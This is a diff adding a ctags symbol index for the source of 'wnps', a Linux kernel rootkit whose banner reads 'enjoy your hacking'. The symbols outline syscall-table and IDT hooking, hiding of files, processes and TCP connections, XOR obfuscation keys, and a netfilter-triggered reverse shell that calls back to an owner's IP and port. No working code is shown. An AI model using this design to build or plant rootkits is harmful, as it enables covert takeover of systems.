@@ -1,0 +1,123 @@
+!_TAG_FILE_FORMAT	2	/extended format; --format=1 will not append ;" to lines/
+!_TAG_FILE_SORTED	1	/0=unsorted, 1=sorted, 2=foldcase/
+!_TAG_PROGRAM_AUTHOR	Darren Hiebert	/dhiebert@users.sourceforge.net/
+!_TAG_PROGRAM_NAME	Exuberant Ctags	//
+!_TAG_PROGRAM_URL	http://ctags.sourceforge.net	/official site/
+!_TAG_PROGRAM_VERSION	5.9~svn20110310	//
+ASMIDType	hook.h	20;"	d
+BUFF	hook.h	7;"	d
+BUFF_NUM	kshell.c	41;"	d	file:
+CONFIG_H	config.h	6;"	d
+CallHookedSyscall	hook.h	32;"	d
+DAFTER_CALL	hook.h	17;"	d
+DEBUG	config.h	11;"	d
+DIRECALL	hook.h	12;"	d
+DNRSYSCALLS	hook.h	18;"	d
+ECHAR	kshell.c	46;"	d	file:
+ENCRYPT	config.h	12;"	d
+HIDE_FILE	config.h	16;"	d
+HIDE_TASK	config.h	17;"	d
+HOME	config.h	19;"	d
+HOOK_H	hook.h	2;"	d
+HOST_H	host.h	2;"	d
+IP_NUM	kshell.c	40;"	d	file:
+JmPushRet	hook.h	23;"	d
+KERNELBUILD	Makefile	/^KERNELBUILD := \/lib\/modules\/$(shell uname -r)\/build$/;"	m
+KSHELL_H	kshell.h	2;"	d
+M	Makefile	/^	make -C $(KERNELBUILD) M=$(shell pwd) modules$/;"	m
+MODULE	hook.c	15;"	d	file:
+ORIG_EXIT	hook.h	11;"	d
+PID	config.h	26;"	d
+PORT_NUM	kshell.c	39;"	d	file:
+PROC_HOME	hook.h	5;"	d
+READ_NUM	hook.h	9;"	d
+SALTO	hook.h	13;"	d
+SGETDENTS64	hook.h	15;"	d
+SGID	config.h	23;"	d
+SIG	config.h	25;"	d
+SKILL	hook.h	14;"	d
+SREAD	hook.h	16;"	d
+SYSCALLS_H	syscalls.h	2;"	d
+SYSENTER_ENTRY	hook.h	6;"	d
+Sys_getdents64	hook.c	/^asmlinkage long Sys_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)$/;"	f
+Sys_read	hook.c	/^asmlinkage ssize_t Sys_read(int fd, void *buf, size_t nbytes)$/;"	f
+TCP_SHELL_KEY	config.h	14;"	d
+TIOCGWINSZ	kshell.c	44;"	d	file:
+TIOCSCTTY	kshell.c	43;"	d	file:
+TIOCSWINSZ	kshell.c	45;"	d	file:
+TMPSZ	config.h	21;"	d
+__KERNEL__	hook.c	11;"	d	file:
+__NR_e_exit	kshell.c	48;"	d	file:
+after_call	hook.h	/^unsigned long dire_call,dire_exit,after_call;$/;"	v
+banner	kshell.h	/^char banner[200] = {"\\n\\33[1;31m\\t\\t#welcome to use wnps rookit.enjoy your hacking#\\n\\n"};$/;"	v
+base	hook.h	/^        unsigned long base;$/;"	m	struct:__anon1
+connect_ip	kshell.c	/^char connect_ip[IP_NUM] = {0};$/;"	v
+descriptor_idt	hook.h	/^struct descriptor_idt$/;"	s
+dire_call	hook.h	/^unsigned long dire_call,dire_exit,after_call;$/;"	v
+dire_exit	hook.h	/^unsigned long dire_call,dire_exit,after_call;$/;"	v
+earg	kshell.h	/^char *earg[3] = { "sh", "-i",NULL };$/;"	v
+encrypt_code	kshell.c	/^void encrypt_code(char *buf,int count)$/;"	f
+env	kshell.h	/^char *env[] = $/;"	v
+epty	kshell.c	/^int ptmx,epty;$/;"	v
+errno	hook.h	/^int errno;$/;"	v
+get_pty	kshell.c	/^int get_pty(void)$/;"	f
+get_sct_addr	hook.c	/^void *get_sct_addr(unsigned int system_call)$/;"	f
+get_sysenter_entry	hook.c	/^void *get_sysenter_entry(void)$/;"	f
+hacked_tcp4_seq_show	hook.c	/^int hacked_tcp4_seq_show(struct seq_file *seq, void *v)$/;"	f
+hook	hook.c	/^void hook(void)$/;"	f
+hook_func	kshell.c	/^unsigned int hook_func(unsigned int hooknum,$/;"	f
+idt48	hook.h	/^}__attribute__ ((packed)) idt48;$/;"	v	typeref:struct:__anon1
+ignore1	hook.h	/^        unsigned short ignore1;$/;"	m	struct:descriptor_idt
+ignore2	hook.h	/^        unsigned short ignore2;$/;"	m	struct:descriptor_idt
+ip	host.h	/^	unsigned long ip;$/;"	m	struct:owner_host
+kshell	kshell.c	/^int kshell(int ip,int port)$/;"	f
+limit	hook.h	/^        unsigned short limit;$/;"	m	struct:__anon1
+my__syscall_return	syscalls.h	6;"	d
+my_syscall0	syscalls.h	16;"	d
+my_syscall1	syscalls.h	26;"	d
+my_syscall2	syscalls.h	36;"	d
+my_syscall3	syscalls.h	47;"	d
+my_syscall4	syscalls.h	58;"	d
+my_syscall5	syscalls.h	69;"	d
+myowner_ip	kshell.c	/^unsigned long myowner_ip;$/;"	v
+myowner_port	kshell.c	/^unsigned long myowner_port;$/;"	v
+netfilter_test_exit	kshell.c	/^void netfilter_test_exit(void)$/;"	f
+netfilter_test_init	kshell.c	/^int netfilter_test_init(void)$/;"	f
+new_idt	hook.c	/^void new_idt(void)$/;"	f
+nfho	kshell.c	/^struct nf_hook_ops nfho;$/;"	v	typeref:struct:nf_hook_ops
+offset_high	hook.h	/^        unsigned short offset_high;$/;"	m	struct:descriptor_idt
+offset_low	hook.h	/^        unsigned short offset_low;$/;"	m	struct:descriptor_idt
+old_tcp4_seq_show	hook.c	/^int (*old_tcp4_seq_show)(struct seq_file *,void *);$/;"	v
+orig_getdents64	hook.c	/^asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);$/;"	v
+orig_read	hook.c	/^asmlinkage ssize_t (*orig_read)(int fd, void *buf, size_t nbytes);$/;"	v
+owner_host	host.h	/^struct owner_host{$/;"	s
+port	host.h	/^	unsigned long port;$/;"	m	struct:owner_host
+ptmx	kshell.c	/^int ptmx,epty;$/;"	v
+read_activo	hook.h	/^atomic_t read_activo;$/;"	v
+read_buf	hook.c	/^static char read_buf[BUFF];$/;"	v	file:
+read_kallsyms	hook.c	/^int read_kallsyms(void)$/;"	f
+set_idt_handler	hook.c	/^void set_idt_handler(void *system_call)$/;"	f
+set_sysenter_handler	hook.c	/^void set_sysenter_handler(void *sysenter)$/;"	f
+shell_lock	kshell.c	/^spinlock_t shell_lock = SPIN_LOCK_UNLOCKED;$/;"	v
+start_shell	kshell.c	/^void start_shell(void)$/;"	f
+strnstr	hook.c	/^char *strnstr(const char *haystack,const char *needle,size_t n)$/;"	f
+sys_call_table	hook.h	/^void **sys_call_table;$/;"	v
+sys_call_table_addr	hook.h	/^void *sys_call_table_addr;$/;"	v
+sysenter	hook.c	/^unsigned long sysenter;$/;"	v
+sysenter_entry	hook.h	/^void *sysenter_entry;$/;"	v
+system_call_addr	hook.h	/^unsigned int system_call_addr;$/;"	v
+winsize	kshell.c	/^struct winsize {$/;"	s	file:
+wnps-objs	Makefile	/^wnps-objs := hook.o kshell.o$/;"	m
+wnps_atoi	kshell.c	/^int wnps_atoi(const char *str)$/;"	f
+wnps_exit	hook.c	/^module_exit(wnps_exit);$/;"	v
+wnps_exit	hook.c	/^void wnps_exit(void)$/;"	f
+wnps_in_aton	kshell.c	/^__u32 wnps_in_aton(const char *str)$/;"	f
+wnps_init	hook.c	/^int wnps_init(void)$/;"	f
+wnps_init	hook.c	/^module_init(wnps_init);$/;"	v
+wnps_lock	hook.h	/^spinlock_t wnps_lock = SPIN_LOCK_UNLOCKED;$/;"	v
+ws_col	kshell.c	/^        unsigned short ws_col;$/;"	m	struct:winsize	file:
+ws_row	kshell.c	/^        unsigned short ws_row;$/;"	m	struct:winsize	file:
+ws_xpixel	kshell.c	/^        unsigned short ws_xpixel;$/;"	m	struct:winsize	file:
+ws_ypixel	kshell.c	/^        unsigned short ws_ypixel;$/;"	m	struct:winsize	file:
+wztshell	kshell.c	/^unsigned int wztshell = 0;$/;"	v
+xorkeys	kshell.c	/^unsigned char xorkeys[5] = {'x','s','e','c',0};$/;"	v
